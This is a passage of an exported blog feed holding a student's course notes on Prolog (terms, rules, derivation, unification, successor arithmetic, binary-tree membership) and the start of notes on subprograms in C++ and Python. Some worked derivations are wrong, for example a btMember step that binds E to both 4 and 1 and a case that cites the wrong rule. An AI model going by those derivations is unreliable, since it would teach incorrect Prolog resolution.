<li><p>In general, query can carry many subqueries:<br>  $$\text{?-} \space G_1, \cdots , G_m \quad \forall m \geq 0 \quad \text{where G is an query}$$</p>
<ul>
<li>use <code>,</code> to conjunct the subqueries  <figure class="highlight prolog"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Are there X &amp; Z such that X is the father of Z and Z is the father of Kari? */</span></span><br><span class="line">?- father(<span class="symbol">X</span>, <span class="symbol">Z</span>), father(<span class="symbol">Z</span>, kari).</span><br><span class="line"><span class="comment">/* X = george</span></span><br><span class="line"><span class="comment">   Z = randy */</span></span><br></pre></td></tr></table></figure></li>
<li>When $m&#x3D;0$, it is an empty query</li>
</ul>
</li>
</ul>
<h3 id="Terms"><a href="#Terms" class="headerlink" title="Terms"></a>Terms</h3><ul>
<li>Prolog programs are constructed from terms which can be constants, variables or structures</li>
</ul>
<ol>
<li><p><strong>Constants</strong></p>
<ul>
<li>represent a specific object</li>
<li>must start with a lower-case letter <code>karl</code></li>
<li>they can be number (but we just focus on the logical part so we seldom use number)</li>
</ul>
</li>
<li><p><strong>Variables</strong></p>
<ul>
<li>must start with a upper-case letter <code>X, Y, Z</code></li>
</ul>
</li>
<li><p><strong>Structures</strong></p>
<ul>
<li>They consist of a functor and a number of arguments<ul>
<li><code>bonks(big_doge, small_doge)</code></li>
<li><font color="3A75EA">functor</font>: <code>bonks</code></li>
<li><font color="3A75EA">arguments</font>: <code>big_doge</code>, <code>small_doge</code></li>
</ul>
</li>
<li>Advanced usage:<ul>
<li>Suppose we want to represent a location on a map, we can use a structure with two components a latitude (<code>p</code>) and a longitude (<code>q</code>) <code>loc(p, q)</code></li>
</ul>
</li>
</ul>
</li>
<li><p><strong>Functor</strong></p>
<ul>
<li>glue some objects into a composite object</li>
<li>A functor may have only one argument (for labeling an argument)<ul>
<li><code>south(32)</code></li>
<li><code>loc(north(45), east(72))</code></li>
</ul>
</li>
</ul>
</li>
</ol>
<h3 id="Rules"><a href="#Rules" class="headerlink" title="Rules"></a>Rules</h3><ul>
<li><p>Some concepts are based on the others</p>
<ul>
<li><p>e.g., To find a parent, we have to ask two questions to obtain a single piece of information</p>
  <figure class="highlight prolog"><table><tr><td class="code"><pre><span class="line">?- father(<span class="symbol">X</span>,kari).</span><br><span class="line">?- mother(<span class="symbol">X</span>,kari).</span><br></pre></td></tr></table></figure>
<ul>
<li>either of the above queries succeeds, a parent of Kari is found</li>
</ul>
</li>
<li><p>We can translate the “parent” concept into the “father” and “mother” concepts using Rules</p>
</li>
</ul>
</li>
<li><p>Form of Rules:<br>  $$H \space \text{:-} \space B_1, \cdots, B_n \quad \forall n \geq 0 \quad \text{where H is the head and B is the body of the rule}$$</p>
<ul>
<li><p>Variables in a rule are universally quantified</p>
  <figure class="highlight prolog"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Parent: For all X &amp; Y, X is a parent of Y if X is a father or mother of Y. */</span></span><br><span class="line">parent(<span class="symbol">X</span>, <span class="symbol">Y</span>) :- father(<span class="symbol">X</span>, <span class="symbol">Y</span>).</span><br><span class="line">parent(<span class="symbol">X</span>, <span class="symbol">Y</span>) :- mother(<span class="symbol">X</span>, <span class="symbol">Y</span>).</span><br><span class="line"></span><br><span class="line">?- parent(<span class="symbol">X</span>, kari). <span class="comment">/* X = randy */</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>More exmaples:</p>
  <figure class="highlight prolog"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Grandfather: For all X, Y &amp; Z, X is a grandfather of Z </span></span><br><span class="line"><span class="comment">                if X is a father of Y and Y is a parent of Z. */</span></span><br><span class="line">grandfather(<span class="symbol">X</span>, <span class="symbol">Z</span>) :- father(<span class="symbol">X</span>, <span class="symbol">Y</span>), parent(<span class="symbol">Y</span>, <span class="symbol">Z</span>).</span><br><span class="line"></span><br><span class="line">?- grandfather(<span class="symbol">X</span>, <span class="symbol">Y</span>).</span><br><span class="line"><span class="comment">/* X = george       X = randy       X = randy</span></span><br><span class="line"><span class="comment">   Y = kari;        Y = mary;       Y = peter */</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>Rule for ancestor</p>
<ul>
<li>A parent is an ancestor<br>  <code>ancestor(X, Y) :- parent(X, Y)</code></li>
<li>An ancestor of <code>X</code>: a parent of an ancestor of an individual <code>X</code><br>  <code>ancestor(X, Z) :- parent(X, Y), ancestor(Y, Z)</code></li>
</ul>
</li>
</ul>
</li>
<li><p>Unconditional Rules</p>
<ul>
<li>the rules with no body $n&#x3D;0$ is an unconditional rule  <figure class="highlight prolog"><table><tr><td class="code"><pre><span class="line">loves(<span class="symbol">X</span>, doge).  <span class="comment">/* Everyone loves doge */</span></span><br><span class="line">loves(doge, <span class="symbol">X</span>).  <span class="comment">/* doge loves Everyone */</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
<h2 id="Answer-and-Response"><a href="#Answer-and-Response" class="headerlink" title="Answer and Response"></a>Answer and Response</h2><ol>
<li><p>If the query <font color="F54747">has variables</font></p>
<ul>
<li>the answer subsitution may assign a constant to some of the variables in the query  <figure class="highlight prolog"><table><tr><td class="code"><pre><span class="line">?- father(<span class="symbol">X</span>, randy).</span><br><span class="line"><span class="symbol">X</span> = george              <span class="comment">/* Answer subsitution */</span></span><br><span class="line">father(george, randy)   <span class="comment">/* Answer */</span></span><br><span class="line">yes                     <span class="comment">/* Response */</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>If the query has <font color="F54747">no variables</font></p>
<ul>
<li>the answer subsitution is vacuous (i.e., the query itself is the Answer)  <figure class="highlight prolog"><table><tr><td class="code"><pre><span class="line">?- father(george, randy).</span><br><span class="line">yes     <span class="comment">/* Response */</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>When a program consists of <font color="F54747">facts only</font></p>
<ul>
<li>for the correct answer, the answer must literally appear as a fact in the program  <figure class="highlight prolog"><table><tr><td class="code"><pre><span class="line">?- grandfather(george, <span class="symbol">X</span>).</span><br><span class="line"><span class="symbol">X</span> = kari</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>
<h2 id="Deriving-Answers"><a href="#Deriving-Answers" class="headerlink" title="Deriving Answers"></a>Deriving Answers</h2><ul>
<li><p>Steps for deriving answers in Prolog</p>
</li>
<li><p><font color="F54747"><strong>Reduction</strong></font></p>
<ul>
<li>A query can be replaced to another by matching the head of the rule.</li>
<li>If a sub-query matched a fact, then that sub-query can be reduced and applying the matching substitution to the entire resulting query.</li>
</ul>
</li>
<li><p><font color="F54747"><strong>Derivation</strong></font></p>
<ul>
<li><p>a sequence of queries and substitutions</p>
</li>
<li><p>Rules:</p>
  <figure class="highlight prolog"><table><tr><td class="code"><pre><span class="line">grandfather(<span class="symbol">X</span>,<span class="symbol">Z</span>) :- father(<span class="symbol">X</span>,<span class="symbol">Y</span>), parent(<span class="symbol">Y</span>,<span class="symbol">Z</span>).   <span class="comment">/* R1 */</span></span><br><span class="line">parent(<span class="symbol">X</span>,<span class="symbol">Y</span>) :- mother(<span class="symbol">X</span>,<span class="symbol">Y</span>).                     <span class="comment">/* R2 */</span></span><br><span class="line">mother(caroline, nina).                         <span class="comment">/* R3 */</span></span><br><span class="line">father(edwyn, caroline).                        <span class="comment">/* R4 */</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>Derivation:</p>
  <figure class="highlight prolog"><table><tr><td class="code"><pre><span class="line"><span class="symbol">Q1</span>: ?- grandfather(<span class="symbol">U</span>, nina).</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Replace Q1 with R1 and Subsitute X = U &amp; Z = nina */</span></span><br><span class="line"><span class="symbol">Q2</span>: ?- father(<span class="symbol">U</span>, <span class="symbol">Y</span>), parent(<span class="symbol">Y</span>, nina).   <span class="comment">/* By R1 */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Reduce &quot;father&quot; subquery and Subsitute U = edwyn &amp; Y = caroline */</span></span><br><span class="line"><span class="symbol">Q3</span>: ?- parent(caroline, nina)           <span class="comment">/* By R4 */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Replace Q3 with R2 */</span></span><br><span class="line"><span class="symbol">Q4</span>: ?- mother(caroline, nina).          <span class="comment">/* By R2 */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Reduce &quot;mother&quot; subquery */</span></span><br><span class="line"><span class="symbol">Q5</span>: &#123;&#125;                                  <span class="comment">/* By R3 */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Successful: grandfather(edwyn, nina) */</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>Successful Derivation</p>
<ul>
<li>it ends in the empty query</li>
<li>variables in rules serve only as place holders  <figure class="highlight prolog"><table><tr><td class="code"><pre><span class="line">parent(<span class="symbol">A</span>,<span class="symbol">B</span>) :- father(<span class="symbol">A</span>,<span class="symbol">B</span>).</span><br><span class="line"><span class="comment">/* Is equivalent to */</span></span><br><span class="line">parent(<span class="symbol">X</span>,<span class="symbol">Y</span>) :- father(<span class="symbol">X</span>,<span class="symbol">Y</span>).</span><br></pre></td></tr></table></figure></li>
<li>the matching is <font color="3A75EA">two-way</font> (<font color="F54747">unification</font>)  <figure class="highlight prolog"><table><tr><td class="code"><pre><span class="line">father(<span class="symbol">X</span>,caroline) <span class="comment">/* matches */</span> father(edwyn,<span class="symbol">Y</span>)</span><br><span class="line"><span class="symbol">X</span> = edwyn</span><br><span class="line"><span class="symbol">Y</span> = caroline</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
<hr>
<h3 id="Axiomatization-of-Natural-Numbers"><a href="#Axiomatization-of-Natural-Numbers" class="headerlink" title="Axiomatization of Natural Numbers"></a>Axiomatization of Natural Numbers</h3><ul>
<li><code>0</code>: the number 0</li>
<li><code>s(X)</code>: the successor of <code>X</code> (or <code>X+1</code>)</li>
<li><code>s(0) = 1, s(s(0)) = 2, ...</code></li>
<li>Rules: summation  <figure class="highlight prolog"><table><tr><td class="code"><pre><span class="line">sum(<span class="number">0</span>,<span class="symbol">X</span>,<span class="symbol">X</span>).                     <span class="comment">/* R1 */</span></span><br><span class="line">sum(s(<span class="symbol">X</span>),<span class="symbol">Y</span>,s(<span class="symbol">Z</span>)) :- sum(<span class="symbol">X</span>,<span class="symbol">Y</span>,<span class="symbol">Z</span>). <span class="comment">/* R2: If X+Y=Z, then s(X)+Y=s(Z) */</span></span><br></pre></td></tr></table></figure></li>
<li>Derivation<ul>
<li><p>Example 1:</p>
  <figure class="highlight prolog"><table><tr><td class="code"><pre><span class="line"><span class="symbol">Q1</span>: ?- sum(s(<span class="number">0</span>),s(<span class="number">0</span>),<span class="symbol">X</span>).</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Unifying sum(s(0),s(0),X) with sum(s(A),B,s(C)) */</span></span><br><span class="line"><span class="comment">/* Using A = 0, B = s(0), X = s(C) */</span></span><br><span class="line"><span class="symbol">Q2</span>: ?- sum(<span class="number">0</span>, s(<span class="number">0</span>), <span class="symbol">C</span>).</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Unifying sum(0, s(0), C) with sum(0,D,D) */</span></span><br><span class="line"><span class="comment">/* Using D = s(0), D = C = s(0) */</span></span><br><span class="line"><span class="symbol">Q3</span>: ?- &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="symbol">Answer</span>: <span class="symbol">X</span> = s(<span class="symbol">C</span>) = s(s(<span class="number">0</span>))</span><br></pre></td></tr></table></figure>
</li>
<li><p>Example 2:</p>
  <figure class="highlight prolog"><table><tr><td class="code"><pre><span class="line"><span class="symbol">Q1</span>: ?- sum(<span class="symbol">X</span>, s(<span class="number">0</span>), s(s(<span class="number">0</span>))).</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Unifying sum(X, s(0), s(s(0))) with sum(s(A),B,s(C)) */</span></span><br><span class="line"><span class="comment">/* Using X = s(A), Y = s(0), s(C) = s(s(0)) */</span></span><br><span class="line"><span class="symbol">Q2</span>: ?- sum(<span class="symbol">A</span>, s(<span class="number">0</span>), s(<span class="number">0</span>)).</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Unifying sum(A, s(0), s(0)) with sum(0,D,D) */</span></span><br><span class="line"><span class="comment">/* Using A = 0, D = s(0) */</span></span><br><span class="line"><span class="symbol">Q3</span>: ?- &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="symbol">Answer</span>: <span class="symbol">X</span> = s(<span class="symbol">A</span>) = s(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
</li>
<li><p>Example 3:</p>
  <figure class="highlight prolog"><table><tr><td class="code"><pre><span class="line"><span class="symbol">Q1</span>: ?- sum(<span class="symbol">X</span>,<span class="symbol">Y</span>,s(s(<span class="number">0</span>))).</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Unifying sum(X,Y,s(s(0))) with sum(0,X,X) */</span></span><br><span class="line"><span class="comment">/* Using X = 0, Y = A = s((0)) */</span></span><br><span class="line"><span class="symbol">Q2</span>: ?- &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="symbol">Ans</span>: <span class="symbol">X</span> = <span class="number">0</span>, <span class="symbol">Y</span> = s((<span class="number">0</span>))</span><br></pre></td></tr></table></figure>

  <figure class="highlight prolog"><table><tr><td class="code"><pre><span class="line"><span class="symbol">Q1</span>: ?- sum(<span class="symbol">X</span>,<span class="symbol">Y</span>,s(s(<span class="number">0</span>))).</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Unifying sum(X,Y,s(s(0))) with sum(s(A),B,s(C)) */</span></span><br><span class="line"><span class="comment">/* Using X = s(A), Y = B, s(C) = s(s(0)) */</span></span><br><span class="line"><span class="symbol">Q2</span>: ?- sum(<span class="symbol">A</span>, <span class="symbol">B</span>, s(<span class="number">0</span>)).</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Unifying sum(A, B, s(0)) with sum(0,D,D) */</span></span><br><span class="line"><span class="comment">/* Using A = 0, B = D = s(0) */</span></span><br><span class="line"><span class="symbol">Q3</span>: ?- &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="symbol">Ans</span>: <span class="symbol">X</span> = s(<span class="number">0</span>), <span class="symbol">Y</span> = s(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>

  <figure class="highlight prolog"><table><tr><td class="code"><pre><span class="line"><span class="symbol">Answer</span>: <span class="symbol">X</span> = <span class="number">0</span>          <span class="symbol">X</span> = s(<span class="number">0</span>)        </span><br><span class="line">        <span class="symbol">Y</span> = s((<span class="number">0</span>));    <span class="symbol">Y</span> = s(<span class="number">0</span>);</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
<hr>
<hr>
<h3 id="Representing-Binary-Trees"><a href="#Representing-Binary-Trees" class="headerlink" title="Representing Binary Trees"></a>Representing Binary Trees</h3><ul>
<li><p>Binary Trees in Prolog</p>
  <img src="https://p.ipic.vip/wo8hd9.png" width="150px" />

<ul>
<li>Rules:  <figure class="highlight prolog"><table><tr><td class="code"><pre><span class="line">btMember(<span class="symbol">E</span>,bt(<span class="symbol">L</span>,<span class="symbol">E</span>,<span class="symbol">R</span>)).                      <span class="comment">/* Rule 1 */</span></span><br><span class="line">btMember(<span class="symbol">E</span>,bt(<span class="symbol">L</span>,<span class="symbol">Rt</span>,<span class="symbol">R</span>)) :- btMember(<span class="symbol">E</span>,<span class="symbol">L</span>).    <span class="comment">/* Rule 2 */</span></span><br><span class="line">btMember(<span class="symbol">E</span>,bt(<span class="symbol">L</span>,<span class="symbol">Rt</span>,<span class="symbol">R</span>)) :- btMember(<span class="symbol">E</span>,<span class="symbol">R</span>).    <span class="comment">/* Rule 3 */</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>Derivation</p>
<ul>
<li><p>Example 1:    </p>
  <figure class="highlight prolog"><table><tr><td class="code"><pre><span class="line"><span class="symbol">Q1</span>: ?- btMember(<span class="number">4</span>,bt(bt(nil,<span class="number">2</span>,bt(nil,<span class="number">4</span>,nil)),<span class="number">1</span>,bt(bt(nil,<span class="number">5</span>,nil),<span class="number">3</span>,nil))).</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Unifying with btMember(E,bt(L,E,R)) */</span></span><br><span class="line"><span class="comment">/* E=4, L=bt(nil,2,bt(nil,4,nil)), E=1, R=bt(bt(nil,5,nil),3,nil) */</span></span><br><span class="line"><span class="symbol">Q2</span>: ?- &#123;&#125;</span><br><span class="line"></span><br><span class="line">yes</span><br></pre></td></tr></table></figure>
</li>
<li><p>Example 2:</p>
  <figure class="highlight prolog"><table><tr><td class="code"><pre><span class="line">?- btMember(<span class="symbol">E</span>,bt(bt(nil,<span class="number">2</span>,bt(nil,<span class="number">4</span>,nil)),<span class="number">1</span>,bt(bt(nil,<span class="number">5</span>,nil),<span class="number">3</span>,nil))).</span><br></pre></td></tr></table></figure>

<ul>
<li><p><code>E = 1</code>:<br>  Q1: ?- btMember(E,bt(bt(nil,2,bt(nil,4,nil)),1,bt(bt(nil,5,nil),3,nil))).</p>
  <figure class="highlight prolog"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Unifying with Rule 1 */</span></span><br><span class="line"><span class="comment">/* E=1, L=bt(nil,2,bt(nil,4,nil)), R=bt(bt(nil,5,nil),3,nil) */</span></span><br><span class="line"><span class="symbol">Q2</span>: ?- &#123;&#125;</span><br><span class="line"><span class="symbol">Ans</span>: <span class="symbol">E</span> = <span class="number">1</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><code>E = 2</code>:</p>
  <figure class="highlight prolog"><table><tr><td class="code"><pre><span class="line"><span class="symbol">Q1</span>: ?- btMember(<span class="symbol">E</span>,bt(bt(nil,<span class="number">2</span>,bt(nil,<span class="number">4</span>,nil)),<span class="number">1</span>,bt(bt(nil,<span class="number">5</span>,nil),<span class="number">3</span>,nil))).</span><br><span class="line"><span class="comment">/* Unifying with Rule 2 */</span></span><br><span class="line"><span class="symbol">Q2</span>: ?- btMember(<span class="symbol">E</span>,bt(nil,<span class="number">2</span>,bt(nil,<span class="number">4</span>,nil))).</span><br><span class="line"><span class="comment">/* E=2, L=nil, R=bt(nil,4,nil) */</span></span><br><span class="line"><span class="symbol">Q3</span>: ?- &#123;&#125;</span><br><span class="line"><span class="symbol">Ans</span>: <span class="symbol">E</span> = <span class="number">2</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><code>E = 3</code>:</p>
  <figure class="highlight prolog"><table><tr><td class="code"><pre><span class="line"><span class="symbol">Q1</span>: ?- btMember(<span class="symbol">E</span>,bt(bt(nil,<span class="number">2</span>,bt(nil,<span class="number">4</span>,nil)),<span class="number">1</span>,bt(bt(nil,<span class="number">5</span>,nil),<span class="number">3</span>,nil))).</span><br><span class="line"><span class="comment">/* Unifying with Rule 2 */</span></span><br><span class="line"><span class="symbol">Q2</span>: ?- btMember(<span class="symbol">E</span>,bt(bt(nil,<span class="number">5</span>,nil),<span class="number">3</span>,nil)).</span><br><span class="line"><span class="comment">/* E=3, L=bt(nil,5,nil), R=nil */</span></span><br><span class="line"><span class="symbol">Q3</span>: ?- &#123;&#125;</span><br><span class="line"><span class="symbol">Ans</span>: <span class="symbol">E</span> = <span class="number">3</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><code>E = 4</code>:</p>
  <figure class="highlight prolog"><table><tr><td class="code"><pre><span class="line"><span class="symbol">Q1</span>: ?- btMember(<span class="symbol">E</span>,bt(bt(nil,<span class="number">2</span>,bt(nil,<span class="number">4</span>,nil)),<span class="number">1</span>,bt(bt(nil,<span class="number">5</span>,nil),<span class="number">3</span>,nil))).</span><br><span class="line"><span class="comment">/* Unifying with Rule 2 */</span></span><br><span class="line"><span class="symbol">Q2</span>: ?- btMember(<span class="symbol">E</span>,bt(nil,<span class="number">2</span>,bt(nil,<span class="number">4</span>,nil))).</span><br><span class="line"><span class="comment">/* Unifying with Rule 3 */</span></span><br><span class="line"><span class="symbol">Q3</span>: ?- btMember(<span class="symbol">E</span>, bt(nil,<span class="number">4</span>,nil))</span><br><span class="line"><span class="comment">/* E=4, L=nil, R=nil */</span></span><br><span class="line"><span class="symbol">Q4</span>: ?- &#123;&#125;</span><br><span class="line"><span class="symbol">Ans</span>: <span class="symbol">E</span> = <span class="number">4</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><code>E = 5</code>:</p>
  <figure class="highlight prolog"><table><tr><td class="code"><pre><span class="line"><span class="symbol">Q1</span>: ?- btMember(<span class="symbol">E</span>,bt(bt(nil,<span class="number">2</span>,bt(nil,<span class="number">4</span>,nil)),<span class="number">1</span>,bt(bt(nil,<span class="number">5</span>,nil),<span class="number">3</span>,nil))).</span><br><span class="line"><span class="comment">/* Unifying with Rule 3 */</span></span><br><span class="line"><span class="symbol">Q2</span>: ?- btMember(<span class="symbol">E</span>,bt(bt(nil,<span class="number">5</span>,nil),<span class="number">3</span>,nil)).</span><br><span class="line"><span class="comment">/* Unifying with Rule 2 */</span></span><br><span class="line"><span class="symbol">Q3</span>: ?- btMember(<span class="symbol">E</span>, bt(nil,<span class="number">5</span>,nil))</span><br><span class="line"><span class="comment">/* E=5, L=nil, R=nil */</span></span><br><span class="line"><span class="symbol">Q4</span>: ?- &#123;&#125;</span><br><span class="line"><span class="symbol">Ans</span>: <span class="symbol">E</span> = <span class="number">5</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>Answer:</p>
  <figure class="highlight prolog"><table><tr><td class="code"><pre><span class="line"><span class="symbol">E</span> = <span class="number">1</span>   <span class="symbol">E</span> = <span class="number">2</span>   <span class="symbol">E</span> = <span class="number">3</span>   <span class="symbol">E</span> = <span class="number">4</span>   <span class="symbol">E</span> = <span class="number">5</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
</li>
</ul>
<hr>
<!-- 
<font color="3A75EA">Blue</font>
<font color="F54747">Red</font>
-->
]]></content>
      <categories>
        <category>CSCI3180</category>
      </categories>
      <tags>
        <tag>Principles</tag>
      </tags>
  </entry>
  <entry>
    <title>Subprogram</title>
    <url>/myBlog/2023/04/27/2023/CSCI3180/2023-4-27-CSCI3180-Subprogram/</url>
    <content><![CDATA[<h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><h3 id="Procedure-amp-Function"><a href="#Procedure-amp-Function" class="headerlink" title="Procedure &amp; Function"></a>Procedure &amp; Function</h3><ul>
<li>Subprograms are collections of statements that define parameterized computations</li>
<li>There are two kinds of subprograms:<ol>
<li><font color="3A75EA">Functions</font> return values</li>
<li><font color="3A75EA">Procedure</font> do not</li>
</ol>
</li>
<li>In most of the languages do not include procedures as a separate form of subprogram (functions that can be defined not to return values can be used as procedures)</li>
</ul>
<h3 id="Execution"><a href="#Execution" class="headerlink" title="Execution"></a>Execution</h3><ul>
<li>Each subprogram has a single entry point</li>
<li>The calling subprogram is <font color="F54747">suspended</font> during execution of the called subprogram (i.e., <font color="F54747">there is only one subprogram in execution in the given time</font>)</li>
<li>Except the program is terminated, control always return to the <font color="F54747">caller</font> at the <font color="3A75EA">subprogram called statement</font> when the called subprogram’s execution terminate</li>
</ul>
<h3 id="Definition"><a href="#Definition" class="headerlink" title="Definition"></a>Definition</h3><ul>
<li><p><font color="3A75EA"><strong>Subprogram Definition</strong></font></p>
<ul>
<li><p>describes the interface to and the actions of the subprogram abstraction</p>
  <figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">f</span><span class="params">()</span></span>&#123;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;haha&quot;</span> &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li><code>f</code> is the definition of this subprogram</li>
</ul>
</li>
<li><p>In Python, function definitions are <font color="F54747"><strong>executable</strong></font></p>
</li>
<li><p>In all other languages, they are <font color="F54747"><strong>non-executable</strong></font></p>
</li>
<li><p>Executable function definition:</p>
  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">is_advanced_operator_allowed = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> is_advanced_operator_allowed:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">is_even</span>(<span class="params">n</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;thinking...&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> n % <span class="number">2</span> == <span class="number">0</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">is_even</span>(<span class="params">n</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;thinking...&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> n == <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">elif</span> n == <span class="number">2</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> is_even(n-<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(is_even(<span class="number">10</span>))</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p><font color="3A75EA"><strong>Subprogram Call</strong></font></p>
<ul>
<li>an explicit request that the subprogram be executed (<code>fun()</code>)</li>
</ul>
</li>
<li><p><font color="3A75EA"><strong>Subprogram Header</strong></font></p>
<ul>
<li>the first part of the definition, including the <font color="3A75EA">name</font>, the kind of subprogram, and the <font color="3A75EA">parameters</font></li>
</ul>
</li>
<li><p><font color="3A75EA"><strong>Parameter Profile</strong></font></p>
<ul>
<li>the number, order, and types of its parameters</li>
</ul>
</li>
<li><p><font color="3A75EA"><strong>Protocol</strong></font></p>
<ul>
<li>the parameter profile and the return type</li>
</ul>
</li>
<li><p><font color="3A75EA"><strong>Subprogram Declaration</strong></font></p>
<ul>
<li>the protocol of the subprogram (prototype in C&#x2F;C++)  <figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">sum</span><span class="params">(<span class="type">int</span>, <span class="type">int</span>)</span></span>;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p><font color="3A75EA"><strong>Parameter</strong></font> (formal parameter)</p>
<ul>
<li>a variable listed in the subprogram header and used in the subprogram  <figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">sum</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span> </span>&#123; &#125;  <span class="comment">// a and b are the parameters</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p><font color="3A75EA"><strong>Argument</strong></font> (actual parameter)</p>
<ul>
<li>the actual input supplied in the subprogram call statement to the subprogram  <figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sum</span>(<span class="number">14</span>, <span class="number">23</span>) <span class="comment">// arguments</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
<h2 id="Correspondence"><a href="#Correspondence" class="headerlink" title="Correspondence"></a>Correspondence</h2><ol>
<li><p><font color="3A75EA"><strong>Positional</strong></font></p>
<ul>
<li>the binding of arguments to parameters is by <font color="3A75EA">position</font></li>
<li><strong>Advantage</strong>: Simple and effective</li>
</ul>
</li>
<li><p><font color="3A75EA"><strong>Keyword</strong></font> (in Python, JavaScript, C#)</p>
<ul>
<li>the name of the parameter is in form of a keyword, to which an argument is to be bound is specified with the argument  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">f</span>(<span class="params">a, b, c</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;a is&quot;</span>, a)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;b is&quot;</span>, b)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;c is&quot;</span>, c)</span><br><span class="line"></span><br><span class="line">f(b=<span class="number">1</span>, a=<span class="number">2</span>, c=<span class="number">3</span>)</span><br><span class="line">f(<span class="number">3</span>, c=<span class="number">9</span>, b=<span class="number">1</span>)</span><br></pre></td></tr></table></figure></li>
<li><strong>Advantage</strong>: arguments can appear in different order</li>
<li><strong>Disadvantage</strong>: users are able to know the parameter’s names</li>
</ul>
</li>
</ol>
<h2 id="Parameter-Default-Values"><a href="#Parameter-Default-Values" class="headerlink" title="Parameter Default Values"></a>Parameter Default Values</h2><ul>
<li>parameters can have default values if no argument is passed</li>
<li><font color="3A75EA"><strong>Note</strong></font>: the default parameters must <font color="F54747">appear last</font>(because parameters are positionally associated)</li>
<li><font color="F54747"><strong>Remind</strong></font>: the default parameters should be assign in subprogram declaration (if have)<ul>
<li><p>default parameter in C++</p>
  <figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">sum</span><span class="params">(<span class="type">int</span>, <span class="type">int</span> = <span class="number">3</span>)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    cout &lt;&lt; <span class="built_in">sum</span>(<span class="number">1</span>) &lt;&lt; endl; <span class="comment">// 4</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">sum</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a + b;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>list of variable number of parameters in Python (<code>*</code>)</p>
